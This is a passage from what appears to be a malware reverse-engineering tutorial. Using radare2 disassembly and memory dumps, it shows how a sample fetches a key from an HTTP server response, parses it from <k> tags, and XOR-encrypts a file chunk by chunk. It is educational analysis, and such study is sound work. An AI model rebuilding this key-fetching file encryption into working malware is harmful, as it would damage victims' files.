<span class="mh">0x7ffc9a81e620</span>  <span class="mh">0x7461440a</span> <span class="mh">0x54203a65</span> <span class="mh">0x202c7568</span> <span class="mh">0x4a203430</span>  <span class="p">.</span><span class="n">Date</span><span class="o">:</span> <span class="n">Thu</span><span class="p">,</span> <span class="mo">04</span> <span class="n">J</span>
<span class="mh">0x7ffc9a81e630</span>  <span class="mh">0x32206e75</span> <span class="mh">0x20303230</span> <span class="mh">0x333a3131</span> <span class="mh">0x39323a31</span>  <span class="n">un</span> <span class="mi">2020</span> <span class="mi">11</span><span class="o">:</span><span class="mi">31</span><span class="o">:</span><span class="mi">29</span>
<span class="mh">0x7ffc9a81e640</span>  <span class="mh">0x544d4720</span> <span class="mh">0x65530a0d</span> <span class="mh">0x72657672</span> <span class="mh">0x7041203a</span>   <span class="n">GMT</span><span class="p">..</span><span class="n">Server</span><span class="o">:</span> <span class="n">Ap</span>
<span class="mh">0x7ffc9a81e650</span>  <span class="mh">0x65686361</span> <span class="mh">0x342e322f</span> <span class="mh">0x2039322e</span> <span class="mh">0x75625528</span>  <span class="n">ache</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">29</span> <span class="p">(</span><span class="n">Ubu</span>
<span class="mh">0x7ffc9a81e660</span>  <span class="mh">0x2975746e</span> <span class="mh">0x614c0a0d</span> <span class="mh">0x4d2d7473</span> <span class="mh">0x6669646f</span>  <span class="n">ntu</span><span class="p">)..</span><span class="n">Last</span><span class="o">-</span><span class="n">Modif</span>
<span class="mh">0x7ffc9a81e670</span>  <span class="mh">0x3a646569</span> <span class="mh">0x64655720</span> <span class="mh">0x3330202c</span> <span class="mh">0x6e754a20</span>  <span class="n">ied</span><span class="o">:</span> <span class="n">Wed</span><span class="p">,</span> <span class="mo">03</span> <span class="n">Jun</span>
<span class="mh">0x7ffc9a81e680</span>  <span class="mh">0x32303220</span> <span class="mh">0x38302030</span> <span class="mh">0x3a36303a</span> <span class="mh">0x47203434</span>   <span class="mi">2020</span> <span class="mi">08</span><span class="o">:</span><span class="mo">06</span><span class="o">:</span><span class="mi">44</span> <span class="n">G</span>
<span class="mh">0x7ffc9a81e690</span>  <span class="mh">0x0a0d544d</span> <span class="mh">0x67615445</span> <span class="mh">0x3122203a</span> <span class="mh">0x61352d32</span>  <span class="n">MT</span><span class="p">..</span><span class="n">ETag</span><span class="o">:</span> <span class="s">"12-5a</span><span class="err">
</span><span class="s">0x7ffc9a81e6a0  0x38393237 0x33303432 0x22353031 0x63410a0d  72982403105"</span><span class="p">..</span><span class="n">Ac</span>
<span class="mh">0x7ffc9a81e6b0</span>  <span class="mh">0x74706563</span> <span class="mh">0x6e61522d</span> <span class="mh">0x3a736567</span> <span class="mh">0x74796220</span>  <span class="n">cept</span><span class="o">-</span><span class="n">Ranges</span><span class="o">:</span> <span class="n">byt</span>
<span class="mh">0x7ffc9a81e6c0</span>  <span class="mh">0x0a0d7365</span> <span class="mh">0x746e6f43</span> <span class="mh">0x2d746e65</span> <span class="mh">0x676e654c</span>  <span class="n">es</span><span class="p">..</span><span class="n">Content</span><span class="o">-</span><span class="n">Leng</span>
<span class="mh">0x7ffc9a81e6d0</span>  <span class="mh">0x203a6874</span> <span class="mh">0x0a0d3831</span> <span class="mh">0x746e6f43</span> <span class="mh">0x2d746e65</span>  <span class="n">th</span><span class="o">:</span> <span class="mi">18</span><span class="p">..</span><span class="n">Content</span><span class="o">-</span>
<span class="mh">0x7ffc9a81e6e0</span>  <span class="mh">0x65707954</span> <span class="mh">0x6574203a</span> <span class="mh">0x702f7478</span> <span class="mh">0x6e69616c</span>  <span class="n">Type</span><span class="o">:</span> <span class="n">text</span><span class="o">/</span><span class="n">plain</span>
<span class="mh">0x7ffc9a81e6f0</span>  <span class="mh">0x0a0d0a0d</span> <span class="mh">0x303e6b3c</span> <span class="mh">0x34333231</span> <span class="mh">0x38373635</span>  <span class="p">....</span><span class="o">&lt;</span><span class="n">k</span><span class="o">&gt;</span><span class="mo">01234567</span><span class="mi">8</span>
<span class="mh">0x7ffc9a81e700</span>  <span class="mh">0x6b2f3c39</span> <span class="mh">0x00000a3e</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>  <span class="mi">9</span><span class="o">&lt;/</span><span class="n">k</span><span class="o">&gt;</span><span class="p">...........</span>
</code></pre></div></div>
<p>Bus as said, the server included http headers and useless information, we proceed to parse the key:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x55fa6e2739ca</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pdf</span>
            <span class="p">;</span> <span class="n">CALL</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">main</span> <span class="err">@</span> <span class="mh">0x55fa6e273df4</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">rip</span><span class="o">:</span>
<span class="err">┌</span> <span class="mi">198</span><span class="o">:</span> <span class="n">sym</span><span class="p">.</span><span class="n">getKey</span> <span class="p">(</span><span class="kt">int64_t</span> <span class="n">arg1</span><span class="p">,</span> <span class="kt">int64_t</span> <span class="n">arg2</span><span class="p">);</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_20h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x20</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_18h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x18</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_10h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x10</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_ch</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0xc</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_8h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x8</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_4h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x4</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">arg</span> <span class="kt">int64_t</span> <span class="n">arg1</span> <span class="err">@</span> <span class="n">rdi</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">arg</span> <span class="kt">int64_t</span> <span class="n">arg2</span> <span class="err">@</span> <span class="n">rsi</span>
<span class="err">│</span>           <span class="mh">0x55fa6e2739ca</span>      <span class="mi">55</span>             <span class="n">push</span> <span class="n">rbp</span>
<span class="err">│</span>           <span class="mh">0x55fa6e2739cb</span>      <span class="mf">4889e5</span>         <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>
<span class="err">│</span>           <span class="mh">0x55fa6e2739ce</span>      <span class="mi">48897</span><span class="n">de8</span>       <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_18h</span><span class="p">],</span> <span class="n">rdi</span> <span class="p">;</span> <span class="n">arg1</span>
<span class="err">│</span>           <span class="mh">0x55fa6e2739d2</span>      <span class="mf">488975e0</span>       <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_20h</span><span class="p">],</span> <span class="n">rsi</span> <span class="p">;</span> <span class="n">arg2</span>
<span class="err">│</span>           <span class="mh">0x55fa6e2739d6</span>      <span class="n">c745f0000000</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_10h</span><span class="p">],</span> <span class="mi">0</span>
<span class="err">│</span>           <span class="mh">0x55fa6e2739dd</span>      <span class="n">c745f4000000</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_ch</span><span class="p">],</span> <span class="mi">0</span>
<span class="err">│</span>           <span class="mh">0x55fa6e2739e4</span>      <span class="n">c745f8000000</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_8h</span><span class="p">],</span> <span class="mi">0</span>
<span class="err">│</span>       <span class="err">┌─</span><span class="o">&lt;</span> <span class="mh">0x55fa6e2739eb</span>      <span class="n">e98a000000</span>     <span class="n">jmp</span> <span class="mh">0x55fa6e273a7a</span>
<span class="err">│</span>      <span class="err">┌──</span><span class="o">&gt;</span> <span class="mh">0x55fa6e2739f0</span>      <span class="mi">8</span><span class="n">b45f0</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_10h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e2739f3</span>      <span class="mi">4863</span><span class="n">d0</span>         <span class="n">movsxd</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e2739f6</span>      <span class="mi">488</span><span class="n">b45e8</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_18h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e2739fa</span>      <span class="mi">4801</span><span class="n">d0</span>         <span class="n">add</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rdx</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e2739fd</span>      <span class="mi">0</span><span class="n">fb600</span>         <span class="n">movzx</span> <span class="n">eax</span><span class="p">,</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273a00</span>      <span class="mi">3</span><span class="n">c3c</span>           <span class="n">cmp</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3c</span>            <span class="p">;</span> <span class="mi">60</span>
<span class="err">│</span>     <span class="err">┌───</span><span class="o">&lt;</span> <span class="mh">0x55fa6e273a02</span>      <span class="mi">7572</span>           <span class="n">jne</span> <span class="mh">0x55fa6e273a76</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a04</span>      <span class="mi">8</span><span class="n">b45f0</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_10h</span><span class="p">]</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a07</span>      <span class="mi">4898</span>           <span class="n">cdqe</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a09</span>      <span class="mi">488</span><span class="n">d5001</span>       <span class="n">lea</span> <span class="n">rdx</span><span class="p">,</span> <span class="p">[</span><span class="n">rax</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a0d</span>      <span class="mi">488</span><span class="n">b45e8</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_18h</span><span class="p">]</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a11</span>      <span class="mi">4801</span><span class="n">d0</span>         <span class="n">add</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rdx</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a14</span>      <span class="mi">0</span><span class="n">fb600</span>         <span class="n">movzx</span> <span class="n">eax</span><span class="p">,</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a17</span>      <span class="mi">3</span><span class="n">c6b</span>           <span class="n">cmp</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x6b</span>            <span class="p">;</span> <span class="mi">107</span>
<span class="err">│</span>    <span class="err">┌────</span><span class="o">&lt;</span> <span class="mh">0x55fa6e273a19</span>      <span class="mi">755</span><span class="n">b</span>           <span class="n">jne</span> <span class="mh">0x55fa6e273a76</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a1b</span>      <span class="mi">8</span><span class="n">b45f0</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_10h</span><span class="p">]</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a1e</span>      <span class="mi">4898</span>           <span class="n">cdqe</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a20</span>      <span class="mi">488</span><span class="n">d5002</span>       <span class="n">lea</span> <span class="n">rdx</span><span class="p">,</span> <span class="p">[</span><span class="n">rax</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a24</span>      <span class="mi">488</span><span class="n">b45e8</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_18h</span><span class="p">]</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a28</span>      <span class="mi">4801</span><span class="n">d0</span>         <span class="n">add</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rdx</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a2b</span>      <span class="mi">0</span><span class="n">fb600</span>         <span class="n">movzx</span> <span class="n">eax</span><span class="p">,</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a2e</span>      <span class="mi">3</span><span class="n">c3e</span>           <span class="n">cmp</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3e</span>            <span class="p">;</span> <span class="mi">62</span>
<span class="err">│</span>   <span class="err">┌─────</span><span class="o">&lt;</span> <span class="mh">0x55fa6e273a30</span>      <span class="mi">7544</span>           <span class="n">jne</span> <span class="mh">0x55fa6e273a76</span>
<span class="err">│</span>   <span class="err">│││╎│</span>   <span class="mh">0x55fa6e273a32</span>      <span class="mi">8</span><span class="n">b45f0</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_10h</span><span class="p">]</span>
<span class="err">│</span>   <span class="err">│││╎│</span>   <span class="mh">0x55fa6e273a35</span>      <span class="mi">83</span><span class="n">c003</span>         <span class="n">add</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">3</span>
<span class="err">│</span>   <span class="err">│││╎│</span>   <span class="mh">0x55fa6e273a38</span>      <span class="mi">8945</span><span class="n">fc</span>         <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_4h</span><span class="p">],</span> <span class="n">eax</span>
<span class="err">│</span>  <span class="err">┌──────</span><span class="o">&lt;</span> <span class="mh">0x55fa6e273a3b</span>      <span class="n">eb27</span>           <span class="n">jmp</span> <span class="mh">0x55fa6e273a64</span>
<span class="err">│</span> <span class="err">┌───────</span><span class="o">&gt;</span> <span class="mh">0x55fa6e273a3d</span>      <span class="mi">8</span><span class="n">b45fc</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_4h</span><span class="p">]</span>
<span class="err">│</span> <span class="err">╎││││╎│</span>   <span class="mh">0x55fa6e273a40</span>      <span class="mi">4863</span><span class="n">d0</span>         <span class="n">movsxd</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span> <span class="err">╎││││╎│</span>   <span class="mh">0x55fa6e273a43</span>      <span class="mi">488</span><span class="n">b45e8</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_18h</span><span class="p">]</span>
<span class="err">│</span> <span class="err">╎││││╎│</span>   <span class="mh">0x55fa6e273a47</span>      <span class="mi">4801</span><span class="n">d0</span>         <span class="n">add</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rdx</span>
<span class="err">│</span> <span class="err">╎││││╎│</span>   <span class="mh">0x55fa6e273a4a</span>      <span class="mi">8</span><span class="n">b55f8</span>         <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_8h</span><span class="p">]</span>
<span class="err">│</span> <span class="err">╎││││╎│</span>   <span class="mh">0x55fa6e273a4d</span>      <span class="mi">4863</span><span class="n">ca</span>         <span class="n">movsxd</span> <span class="n">rcx</span><span class="p">,</span> <span class="n">edx</span>
<span class="err">│</span> <span class="err">╎││││╎│</span>   <span class="mh">0x55fa6e273a50</span>      <span class="mi">488</span><span class="n">b55e0</span>       <span class="n">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_20h</span><span class="p">]</span>
<span class="err">│</span> <span class="err">╎││││╎│</span>   <span class="mh">0x55fa6e273a54</span>      <span class="mi">4801</span><span class="n">ca</span>         <span class="n">add</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">rcx</span>
<span class="err">│</span> <span class="err">╎││││╎│</span>   <span class="mh">0x55fa6e273a57</span>      <span class="mi">0</span><span class="n">fb600</span>         <span class="n">movzx</span> <span class="n">eax</span><span class="p">,</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
<span class="err">│</span> <span class="err">╎││││╎│</span>   <span class="mh">0x55fa6e273a5a</span>      <span class="mi">8802</span>           <span class="n">mov</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rdx</span><span class="p">],</span> <span class="n">al</span>
<span class="err">│</span> <span class="err">╎││││╎│</span>   <span class="mh">0x55fa6e273a5c</span>      <span class="mi">8345</span><span class="n">f801</span>       <span class="n">add</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_8h</span><span class="p">],</span> <span class="mi">1</span>
<span class="err">│</span> <span class="err">╎││││╎│</span>   <span class="mh">0x55fa6e273a60</span>      <span class="mi">8345</span><span class="n">fc01</span>       <span class="n">add</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_4h</span><span class="p">],</span> <span class="mi">1</span>
<span class="err">│</span> <span class="err">╎││││╎│</span>   <span class="p">;</span> <span class="n">CODE</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">sym</span><span class="p">.</span><span class="n">getKey</span> <span class="err">@</span> <span class="mh">0x55fa6e273a3b</span>
<span class="err">│</span> <span class="err">╎└──────</span><span class="o">&gt;</span> <span class="mh">0x55fa6e273a64</span>      <span class="mi">8</span><span class="n">b45f0</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_10h</span><span class="p">]</span>
<span class="err">│</span> <span class="err">╎</span> <span class="err">│││╎│</span>   <span class="mh">0x55fa6e273a67</span>      <span class="mi">83</span><span class="n">c00d</span>         <span class="n">add</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0xd</span>            <span class="p">;</span> <span class="mi">13</span>
<span class="err">│</span> <span class="err">╎</span> <span class="err">│││╎│</span>   <span class="mh">0x55fa6e273a6a</span>      <span class="mi">3945</span><span class="n">fc</span>         <span class="n">cmp</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_4h</span><span class="p">],</span> <span class="n">eax</span>
<span class="err">│</span> <span class="err">└───────</span><span class="o">&lt;</span> <span class="mh">0x55fa6e273a6d</span>      <span class="mi">7</span><span class="n">cce</span>           <span class="n">jl</span> <span class="mh">0x55fa6e273a3d</span>
<span class="err">│</span>   <span class="err">│││╎│</span>   <span class="mh">0x55fa6e273a6f</span>      <span class="n">c745f4010000</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_ch</span><span class="p">],</span> <span class="mi">1</span>
<span class="err">│</span>   <span class="err">└└└───</span><span class="o">&gt;</span> <span class="mh">0x55fa6e273a76</span>      <span class="mi">8345</span><span class="n">f001</span>       <span class="n">add</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_10h</span><span class="p">],</span> <span class="mi">1</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="p">;</span> <span class="n">CODE</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">sym</span><span class="p">.</span><span class="n">getKey</span> <span class="err">@</span> <span class="mh">0x55fa6e2739eb</span>
<span class="err">│</span>      <span class="err">╎└─</span><span class="o">&gt;</span> <span class="mh">0x55fa6e273a7a</span>      <span class="mi">817</span><span class="n">df0ff0000</span><span class="p">.</span>  <span class="n">cmp</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_10h</span><span class="p">],</span> <span class="mh">0xff</span>
<span class="err">│</span>      <span class="err">╎┌─</span><span class="o">&lt;</span> <span class="mh">0x55fa6e273a81</span>      <span class="mi">7</span><span class="n">f0a</span>           <span class="n">jg</span> <span class="mh">0x55fa6e273a8d</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273a83</span>      <span class="mi">837</span><span class="n">df400</span>       <span class="n">cmp</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_ch</span><span class="p">],</span> <span class="mi">0</span>
<span class="err">│</span>      <span class="err">└──</span><span class="o">&lt;</span> <span class="mh">0x55fa6e273a87</span>      <span class="mi">0</span><span class="n">f8463ffffff</span>   <span class="n">je</span> <span class="mh">0x55fa6e2739f0</span>
<span class="err">│</span>       <span class="err">└─</span><span class="o">&gt;</span> <span class="mh">0x55fa6e273a8d</span>      <span class="mi">90</span>             <span class="n">nop</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273a8e</span>      <span class="mi">5</span><span class="n">d</span>             <span class="n">pop</span> <span class="n">rbp</span>
<span class="err">└</span>           <span class="mh">0x55fa6e273a8f</span>      <span class="n">c3</span>             <span class="n">ret</span>
<span class="p">[</span><span class="mh">0x55fa6e2739ca</span><span class="p">]</span><span class="o">&gt;</span> 
</code></pre></div></div>
<p>Getkey function is a bit chaotic but let’s focus on the relevant stuff.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e2739fd</span>      <span class="mi">0</span><span class="n">fb600</span>         <span class="n">movzx</span> <span class="n">eax</span><span class="p">,</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273a00</span>      <span class="mi">3</span><span class="n">c3c</span>           <span class="n">cmp</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3c</span>            <span class="p">;</span> <span class="mi">60</span>
<span class="err">│</span>     <span class="err">┌───</span><span class="o">&lt;</span> <span class="mh">0x55fa6e273a02</span>      <span class="mi">7572</span>           <span class="n">jne</span> <span class="mh">0x55fa6e273a76</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a04</span>      <span class="mi">8</span><span class="n">b45f0</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_10h</span><span class="p">]</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a07</span>      <span class="mi">4898</span>           <span class="n">cdqe</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a09</span>      <span class="mi">488</span><span class="n">d5001</span>       <span class="n">lea</span> <span class="n">rdx</span><span class="p">,</span> <span class="p">[</span><span class="n">rax</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a0d</span>      <span class="mi">488</span><span class="n">b45e8</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_18h</span><span class="p">]</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a11</span>      <span class="mi">4801</span><span class="n">d0</span>         <span class="n">add</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rdx</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a14</span>      <span class="mi">0</span><span class="n">fb600</span>         <span class="n">movzx</span> <span class="n">eax</span><span class="p">,</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a17</span>      <span class="mi">3</span><span class="n">c6b</span>           <span class="n">cmp</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x6b</span>            <span class="p">;</span> <span class="mi">107</span>
<span class="err">│</span>    <span class="err">┌────</span><span class="o">&lt;</span> <span class="mh">0x55fa6e273a19</span>      <span class="mi">755</span><span class="n">b</span>           <span class="n">jne</span> <span class="mh">0x55fa6e273a76</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a1b</span>      <span class="mi">8</span><span class="n">b45f0</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_10h</span><span class="p">]</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a1e</span>      <span class="mi">4898</span>           <span class="n">cdqe</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a20</span>      <span class="mi">488</span><span class="n">d5002</span>       <span class="n">lea</span> <span class="n">rdx</span><span class="p">,</span> <span class="p">[</span><span class="n">rax</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a24</span>      <span class="mi">488</span><span class="n">b45e8</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_18h</span><span class="p">]</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a28</span>      <span class="mi">4801</span><span class="n">d0</span>         <span class="n">add</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rdx</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a2b</span>      <span class="mi">0</span><span class="n">fb600</span>         <span class="n">movzx</span> <span class="n">eax</span><span class="p">,</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a2e</span>      <span class="mi">3</span><span class="n">c3e</span>           <span class="n">cmp</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3e</span>            <span class="p">;</span> <span class="mi">62</span>
<span class="err">│</span>   <span class="err">┌─────</span><span class="o">&lt;</span> <span class="mh">0x55fa6e273a30</span>      <span class="mi">7544</span>           <span class="n">jne</span> <span class="mh">0x55fa6e273a76</span>
</code></pre></div></div>
<p>The program enters inside a loop going char by char on the buffer, then compares the actual character with 60 =’&lt;’. Then it will compare the next 2 characters after it with ‘k’ and ‘&gt;’ It’ll loop ten times extracting the key and thus it will be updated after the return through local var_10h</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x55fa6e273bc4</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pxw</span> <span class="err">@</span> <span class="mh">0x7ffc9a81e5b5</span>
<span class="mh">0x7ffc9a81e5b5</span>  <span class="mh">0x33323130</span> <span class="mh">0x37363534</span> <span class="mh">0x47003938</span> <span class="mh">0x2f205445</span>  <span class="mo">01234567</span><span class="mi">89</span><span class="p">.</span><span class="n">GET</span> <span class="o">/</span>
</code></pre></div></div>
<p>Then the crypt function, I won’t get into a lot of detail on it as we already saw it on previous tutorials in this course. So crypfile opens the file and goes chunk by chunk reading/xoring/writting.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="mh">0x55fa6e273b38</span>      <span class="n">e823fdffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">open</span>       <span class="p">;</span> <span class="kt">int</span> <span class="n">open</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="kt">int</span> <span class="n">oflag</span><span class="p">)</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273b3d</span>      <span class="mf">8945e8</span>         <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_18h</span><span class="p">],</span> <span class="n">eax</span>
<span class="err">│</span>       <span class="err">┌─</span><span class="o">&lt;</span> <span class="mh">0x55fa6e273b40</span>      <span class="n">eb2e</span>           <span class="n">jmp</span> <span class="mh">0x55fa6e273b70</span>
<span class="err">│</span>      <span class="err">┌──</span><span class="o">&gt;</span> <span class="mh">0x55fa6e273b42</span>      <span class="mi">488</span><span class="n">d55ed</span>       <span class="n">lea</span> <span class="n">rdx</span><span class="p">,</span> <span class="p">[</span><span class="n">var_13h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273b46</span>      <span class="mi">488</span><span class="n">b45d0</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_30h</span><span class="p">]</span>
